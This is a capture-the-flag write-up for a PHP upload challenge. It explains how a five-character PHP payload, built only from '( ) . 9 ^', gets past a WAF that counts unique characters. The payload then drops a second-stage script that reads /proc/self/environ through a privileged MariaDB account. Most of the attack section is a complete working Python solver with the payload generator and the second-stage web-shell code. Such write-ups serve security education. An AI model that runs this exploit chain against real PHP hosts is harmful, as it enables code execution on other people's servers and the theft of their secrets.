---
title: "FUK U PHP"
summary: "UMCS Preliminary umcs preliminary, web, forensics writeup covering FUK U PHP with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - web
  - forensics
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** FUK U PHP
**Category:** Web
**Points:** 500
**Flag Format:** `UMCS{}`
**Provided Artifact:** `fuk-u-php.zip`
**Provided URL:**

```text
http://3cad1570-e636-481f-84f1-08072c047c99.chal.umcybersec.site:8001/
```

The challenge presents a PHP file-hosting service. The web page allows users to upload code, and the server automatically wraps the uploaded content inside PHP tags before moving it into the web-accessible `/uploads/` directory.

The objective is to bypass the custom WAF, achieve PHP code execution, and recover the flag. The prompt also gives an important hint:

```text
"Please ignore the flag in environment variables."
```

This strongly suggests that the flag is stored in an environment variable and that the intended solution involves reading process environment data.

---

# Initial Analysis

After extracting the provided source archive, the important files are:

```text
Dockerfile
entrypoint.sh
files/index.php
files/php.ini
files/waf.so
files/explanation_waf.so.txt
files/flag
```

The main upload logic is inside `index.php`:

```php
if(!empty($_FILES['uploaded_file']))
{
    $path = "uploads/";
    if (!file_exists($path)){
        mkdir("/var/www/html/".$path, 0777);
    }

    $path = $path . basename($_FILES['uploaded_file']['name']);

    $filename = $_FILES['uploaded_file']['tmp_name'];
    if (is_readable($filename)){
        if(waf($filename)){
            $file_contents = readfiletostr($filename);
            file_put_contents($filename, "<?php ".$file_contents." ?>");
            if(move_uploaded_file($filename, $path)) {
                echo "The file has been uploaded. You can access it at /uploads/".basename($_FILES['uploaded_file']['name']);
            } else {
                echo "There was an error uploading the file, please try again!";
            }
        } else {
            echo "Blocked by WAF";
        }
    }
}
```

The workflow is:

1. User uploads a file.

2. The server passes the temporary uploaded file path to `waf()`.

3. If `waf()` returns true, the server reads the uploaded content using `readfiletostr()`.

4. The server wraps the content as PHP:


```php
<?php USER_CONTENT ?>
```

5. The file is moved into `/var/www/html/uploads/`.

6. The uploaded file is accessible through the browser.


So if we can upload valid PHP code that passes the WAF, we get PHP code execution.

The custom WAF behavior is described in `explanation_waf.so.txt`:

```c
waf() will check the number of distinct characters in a file.
For example, "system" contains 5 distinct characters.
It returns true if the number of the distinct characters is 5 or less, false otherwise.
```

The relevant C logic is:

```c
int uniqueCount = 0;
for (int i = 0; i < 256; i++) {
    if (seen[i] == 1) {
        uniqueCount++;
    }
}

RETURN_BOOL(uniqueCount < 6);
```

This means the uploaded file must contain **at most 5 unique bytes**.

The Docker setup also reveals a MariaDB service:

```dockerfile
RUN apt-get install -y apache2 php libapache2-mod-php mariadb-server mariadb-client php-mysqli
```

The database user is created in `entrypoint.sh`:

```bash
CREATE DATABASE IF NOT EXISTS `ctf`;
CREATE USER IF NOT EXISTS 'ctf'@'%' IDENTIFIED BY 'ctf';
GRANT ALL PRIVILEGES ON *.* TO 'ctf';
FLUSH PRIVILEGES;
```

This gives us a useful local database account:

```text
Host: 127.0.0.1
User: ctf
Password: [REDACTED_PASSWORD]
```

The `php.ini` file disables many common functions, including direct file-reading and command-execution functions such as:

```text
file_get_contents
system
exec
shell_exec
passthru
proc_open
getenv
```

Therefore, a basic PHP web shell such as this will not work:

```php
system($_GET['cmd']);
```

---

# Vulnerability / Weakness Identification

The core weakness is a **weak character-count WAF combined with PHP’s dynamic expression capabilities**.

The WAF tries to prevent dangerous PHP code by allowing only files with fewer than 6 unique characters. However, PHP is flexible enough to construct strings and function names dynamically using only a very small character set.

The exploit uses only these 5 characters:

```text
( ) . 9 ^
```

These characters are enough to build PHP expressions using:

- Parentheses for grouping

- Dot operator for string concatenation

- Number `9` as the only literal digit

- Bitwise XOR `^` to generate other numbers and characters


Once the payload can dynamically construct strings such as:

```php
chr
file_put_contents
json_decode
```

it can call PHP functions without writing their names directly in the uploaded file.

This bypasses the WAF because the raw uploaded file still contains only 5 unique characters, even though PHP evaluates it into meaningful code at runtime.

The second important weakness is that MariaDB has a privileged local user:

```text
ctf:ctf
```

Because this user has broad privileges, we can use MySQL’s `LOAD_FILE()` function to read files from the database server process context.

The prompt hinted that the flag is in environment variables. Reading:

```text
/proc/self/environ
```

through MySQL causes MariaDB to read its own environment. Since MariaDB is started from the same entrypoint environment, the flag is available there.

---

# Exploitation Strategy

The exploitation plan is:

1. Upload a first-stage PHP payload that uses only 5 unique characters:


```text
( ) . 9 ^
```

2. The WAF accepts the file because the unique character count is exactly 5.

3. The server wraps the payload in PHP tags and places it at:


```text
/uploads/stage1.php
```

4. Trigger `/uploads/stage1.php`.

5. The first-stage payload dynamically reconstructs PHP strings and calls:


```php
file_put_contents("/var/www/html/uploads/g10d.php", SECOND_STAGE_CODE)
```

6. The second-stage file is a normal PHP script. It connects to MariaDB using:


```php
new mysqli("127.0.0.1", "ctf", "ctf");
```

7. The second-stage script runs:


```sql
SELECT LOAD_FILE('/proc/self/environ')
```

8. The output contains the environment variables, including the flag.


This is a two-stage attack:

|Stage|Purpose|
|---|---|
|Stage 1|Bypass WAF using 5-character PHP payload|
|Stage 2|Execute readable PHP code to recover the flag|

The reason we write the second-stage file to an absolute path is important. If the first stage writes to a relative path such as:

```text
uploads/g10d.php
```

then it may write relative to `/var/www/html/uploads/`, producing:

```text
/var/www/html/uploads/uploads/g10d.php
```

To avoid path issues, the solver writes directly to:

```text
/var/www/html/uploads/g10d.php
```

---

# Proof of Concept

The WAF condition can be demonstrated conceptually.

A normal payload like this is blocked:

```php
system("id");
```

It contains too many unique characters.

Instead, the exploit uploads a generated expression containing only:

```text
( ) . 9 ^
```

The script verifies this before uploading:

```python
print(f"[*] Unique chars: {sorted(set(payload))}")
```

Expected output:

```text
[*] Unique chars: ['(', ')', '.', '9', '^']
```

The upload request sends the first-stage payload as `stage1.php`:

```python
files = {
    "uploaded_file": ("stage1.php", payload.encode(), "application/octet-stream")
}

requests.post(BASE + "/", files=files)
```

The server responds:

```text
The file has been uploaded. You can access it at /uploads/stage1.php
```

Then we trigger the first stage:

```bash
curl http://TARGET/uploads/stage1.php
```

This creates the real second-stage PHP file:

```text
/var/www/html/uploads/g10d.php
```

Finally, we request:

```bash
curl http://TARGET/uploads/g10d.php
```

The response contains the flag.

---

# Full Python Solver

```
#!/usr/bin/env python3
import json
import re
import sys
import time
import requests


# ============================================================
# FUK U PHP Solver
#
# Usage:
#   python3 solve_fuk_php.py "http://target:8001"
#
# Example:
#   python3 solve_fuk_php.py "http://d780277e-b9c0-491f-b64e-86c63cdd50dc.chal.umcybersec.site:8001/"
#
# Required:
#   python3 -m pip install requests
#
# ============================================================


if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <base_url>")
    sys.exit(1)


BASE = sys.argv[1].rstrip("/")

UPLOAD_TIMEOUT = 300
REQUEST_TIMEOUT = 120

# Short names reduce generated payload size.
STAGE1_NAME = "s.php"
STAGE2_NAME = "g.php"


def xor(*args):
    return "^".join(f"({a})" for a in args)


def cat(*args):
    return ".".join(f"({a})" for a in args)


def call(f, arg):
    return f"({f})({arg})"


def is_frp_404(resp):
    """
    Detect the custom frp 404 page.
    This usually means the request did not reach the Apache/PHP backend route.
    """
    body = resp.text.lower()
    return (
        resp.status_code == 404
        and "frp" in body
        and "the page you visit not found" in body
    )


def build_payload():
    """
    Build a first-stage PHP payload using only five characters:

        ( ) . 9 ^

    The challenge WAF allows files with fewer than 6 unique characters.
    This payload reconstructs PHP strings/functions at runtime and writes
    a normal second-stage PHP file.
    """

    p = {}

    # ------------------------------------------------------------
    # Numeric/string primitives.
    # ------------------------------------------------------------

    p["INF9"] = "(" + "9" * 309 + ").(9)"
    p[9] = "9"
    p[0] = "9^9"

    p["99"] = cat("9", "9")
    p[106] = "9^99"

    p["1069"] = cat(p[106], p[9])
    p["09"] = cat(p[0], p[9])
    p["80"] = xor(p["09"], p["1069"], p["99"])

    p[51] = xor(p["80"], "99")
    p["519"] = cat(p[51], "9")
    p["48"] = xor(p["519"], p["80"], p["99"])
    p[3] = xor(p[51], p["48"])

    p["00"] = cat(p[0], p[0])
    p["080"] = cat(p[0], p["80"])
    p["01"] = xor(p["00"], p["080"], p["09"])

    p[1] = xor(p["01"], p[0])
    p[2] = xor(p["01"], p[3])
    p[8] = xor(p["01"], p[9])

    p["32"] = cat(p[3], p[2])
    p["39"] = cat(p[3], p[9])

    p[7] = xor(p["39"], p[0], p["32"])
    p[6] = xor(p[7], p[1])
    p[5] = xor(p[7], p[2])
    p[4] = xor(p[5], p[1])

    for a in range(10):
        p[f"{a}{a}"] = cat(p[a], p[a])

    for a, b in [
        (2, 0),
        (9, 8),
        (8, 2),
        (0, 0),
        (2, 2),
        (8, 8),
        (0, 9),
        (3, 9),
        (8, 0),
        (3, 2),
    ]:
        p[f"{a}{b}"] = cat(p[a], p[b])

    # ------------------------------------------------------------
    # Build strval.
    # ------------------------------------------------------------

    p["st"] = xor(p["INF9"], p["00"], p["22"], p["88"])
    p["rv"] = xor(p["INF9"], p["00"], p["20"], p["98"])
    p["AL"] = xor(p["INF9"], p["00"], p["82"])
    p["strvAL"] = cat(p["st"], p["rv"], p["AL"])

    p["9str"] = call(p["strvAL"], "9")
    p["9"] = p["9str"]

    # ------------------------------------------------------------
    # Build chr.
    # ------------------------------------------------------------

    p["r~"] = xor(p["INF9"], p["09"], p["39"], p["80"])
    p["r"] = xor(p["r~"], p["99"], p["9"])
    p["CH"] = xor(p["INF9"], p["20"], cat(p[8], p[6]))
    p["CHr"] = cat(p["CH"], p["r"])

    def gen_num_as_str(n):
        return cat(*[p[int(d)] for d in str(n)])

    def gen_num(n):
        if isinstance(n, int) and n in p:
            return p[n]
        return xor(gen_num_as_str(n), p[0])

    def gen_char(c):
        return call(p["CHr"], gen_num(ord(c)))

    def gen_str(s):
        return cat(*[gen_char(c) for c in s])

    def fcall(name, arg):
        return call(gen_str(name), arg)

    # ------------------------------------------------------------
    # Compact second-stage PHP.
    #
    # It checks:
    #   1. /proc/self/environ
    #   2. /flag
    #
    # Using fewer paths keeps the generated stage1 payload smaller.
    # ------------------------------------------------------------

    shell_path = f"/var/www/html/uploads/{STAGE2_NAME}"

    shell_code = (
        '<?php '
        '$m=new mysqli("127.0.0.1","ctf","ctf");'
        'foreach(["/proc/self/environ","/flag"]as$f){'
        '$q=$m->query("SELECT LOAD_FILE(\'$f\')");'
        'if($q){$r=$q->fetch_row();if($r)echo$r[0];}'
        '}'
        '?>'
    )

    args_json = json.dumps([shell_path, shell_code], separators=(",", ":"))

    payload = fcall(
        "file_put_contents",
        "...(" + fcall("json_decode", gen_str(args_json)) + ")"
    )

    return payload


def check_target(session):
    print("[*] Checking target...")

    try:
        r = session.get(BASE + "/", timeout=30)
        print("[*] Target status:", r.status_code)

        if is_frp_404(r):
            print("[-] Target returned frp 404. Instance may be dead or URL is wrong.")
            return False

        return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Target check failed: {e}")
        return False


def upload_stage1(session, payload):
    files = {
        "uploaded_file": (
            STAGE1_NAME,
            payload.encode(),
            "application/octet-stream",
        )
    }

    print("[*] Uploading stage1...")

    try:
        r = session.post(BASE + "/", files=files, timeout=UPLOAD_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print(f"[-] Upload request failed: {e}")
        return False

    print("[*] Upload status:", r.status_code)
    print(r.text[:300])

    if b"Blocked by WAF" in r.content:
        print("[-] Blocked by WAF")
        return False

    if f"/uploads/{STAGE1_NAME}" in r.text:
        print("[+] Stage1 upload confirmed by server response")
        return True

    print("[!] Upload response did not contain the expected stage1 path")
    return True


def get_candidate_urls(filename):
    """
    Try several URL forms because challenge routing can sometimes be weird.
    """
    return [
        BASE + f"/uploads/{filename}",
        BASE + f"/uploads//{filename}",
        BASE + f"//uploads/{filename}",
    ]


def request_first_working(session, filename, label):
    """
    Request candidate paths and return the first non-frp response.
    """
    urls = get_candidate_urls(filename)

    last_resp = None

    for url in urls:
        print(f"[*] Trying {label}: {url}")

        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            continue

        print(f"[*] {label} status:", r.status_code)

        last_resp = r

        if is_frp_404(r):
            print("[!] Got frp 404 for this path, trying next candidate...")
            continue

        return r

    return last_resp


def trigger_stage1(session):
    """
    Execute the uploaded first-stage PHP file.
    This should write the second-stage PHP file.
    """
    print("[*] Triggering stage1...")

    # Small delay helps if the backend needs a moment after move_uploaded_file().
    time.sleep(1)

    r = request_first_working(session, STAGE1_NAME, "stage1")

    if r is None:
        print("[-] No stage1 response received")
        return False

    print(r.text[:500])

    if r.status_code != 200:
        print("[-] Stage1 did not return HTTP 200")
        return False

    return True


def trigger_stage2(session):
    """
    Execute second-stage PHP and search output for the flag.
    """
    print("[*] Triggering stage2...")

    time.sleep(1)

    r = request_first_working(session, STAGE2_NAME, "stage2")

    if r is None:
        print("[-] No stage2 response received")
        return False

    if r.status_code != 200:
        print("[-] Stage2 did not return HTTP 200")
        print(r.text[:1000])
        return False

    m = re.search(rb"UMCS\{[^}]+\}", r.content)
    if m:
        print("[+] FLAG:", m.group(0).decode(errors="ignore"))
        return True

    print("[-] Flag not found. Raw output preview:")
    print(r.content[:3000])
    return False


def main():
    session = requests.Session()

    print("[*] Building payload...")
    payload = build_payload()

    unique_chars = sorted(set(payload))

    print("[*] Payload length:", len(payload))
    print("[*] Unique chars:", unique_chars)

    if len(unique_chars) > 5:
        raise SystemExit("[-] Payload has too many unique characters")

    if unique_chars != ["(", ")", ".", "9", "^"]:
        print("[!] Warning: unexpected character set")
        print("[!] Expected: ['(', ')', '.', '9', '^']")
        print("[!] Actual:  ", unique_chars)

    if not check_target(session):
        raise SystemExit("[-] Target is not reachable. Restart the instance or check the URL.")

    uploaded = False

    for attempt in range(1, 3):
        print(f"[*] Upload attempt {attempt}/2")

        if upload_stage1(session, payload):
            uploaded = True
            break

        print("[!] Upload failed, retrying once...")
        time.sleep(3)

    if not uploaded:
        raise SystemExit("[-] Could not upload stage1. Restart the instance and rerun.")

    # Recheck target after upload. If this returns frp 404, the instance may have died.
    if not check_target(session):
        raise SystemExit("[-] Target died after upload. Restart instance and rerun.")

    if not trigger_stage1(session):
        raise SystemExit("[-] Stage1 did not execute correctly.")

    if not trigger_stage2(session):
        raise SystemExit("[-] Stage2 did not return the flag.")


if __name__ == "__main__":
    main()

```

---

# Walkthrough

## 1. Install dependencies

The solver only needs Python 3 and `requests`.

```bash
python3 -m pip install requests
```

On Kali, `requests` is usually already installed. If not, install it with:

```bash
sudo apt update
sudo apt install python3-requests
```

## 2. Save the solver

Create the file:

```bash
nano solve_fuk_php.py
```

Paste the Python script into it, then save.

## 3. Run the solver

```bash
python3 solve_fuk_php.py "http://3cad1570-e636-481f-84f1-08072c047c99.chal.umcybersec.site:8001"
```

Expected output:

```text
[*] Payload length: 1161140
[*] Unique chars: ['(', ')', '.', '9', '^']
[*] Uploading stage1...
[*] Upload status: 200
The file has been uploaded. You can access it at /uploads/stage1.php
[*] Triggering stage1...
[*] Stage1 status: 200
[*] Triggering stage2...
[*] Stage2 status: 200
[+] FLAG: UMCS{L3ARNING_P2H2P_INT34341RNALS}
```

## Troubleshooting

### Problem: `Blocked by WAF`

Check that the generated payload has only these characters:

```text
['(', ')', '.', '9', '^']
```

If a newline or extra character is accidentally added to the uploaded payload, the WAF may block it.

### Problem: `/uploads/g10d.php` returns 404

This means the first-stage payload did not successfully write the second-stage file.

Common causes:

1. The first-stage payload failed to execute.

2. The path was written relatively instead of absolutely.

3. The remote instance expired and restarted.


The fixed solver writes to:

```text
/var/www/html/uploads/g10d.php
```

This avoids the common mistake of writing to:

```text
/var/www/html/uploads/uploads/g10d.php
```

### Problem: Stage 2 works but no flag appears

The challenge hint says the flag is in environment variables. The solver reads:

```text
/proc/self/environ
```

through MariaDB. If the remote instance changed or the flag is stored somewhere else, the fallback `/flag` read may still recover it.

---

# Flag

The solver successfully recovered:

```text
UMCS{L3ARNING_P2H2P_INT34341RNALS}
```

---

# Conclusion

The challenge is solved by abusing PHP’s ability to dynamically construct code from very limited syntax. The custom WAF only checks the number of unique characters in the uploaded file, but this is not a reliable security boundary. Using only five characters:

```text
( ) . 9 ^
```

the exploit reconstructs function names and strings at runtime, then writes a normal PHP second-stage script.

The second-stage script avoids disabled PHP file-reading and command-execution functions by abusing the local MariaDB service. Because the `ctf` database user has broad privileges, MySQL’s `LOAD_FILE()` can read `/proc/self/environ`, which contains the flag.

Key lessons:

1. Character-count filters are not a safe way to sandbox PHP.

2. Uploading executable PHP into a web-accessible directory is inherently dangerous.

3. Disabling common functions like `system()` and `file_get_contents()` is not enough if alternative primitives remain available.

4. Local services such as databases can become powerful read primitives when over-permissioned.

5. Environment variables are sensitive and should not be readable through unintended process or service paths.
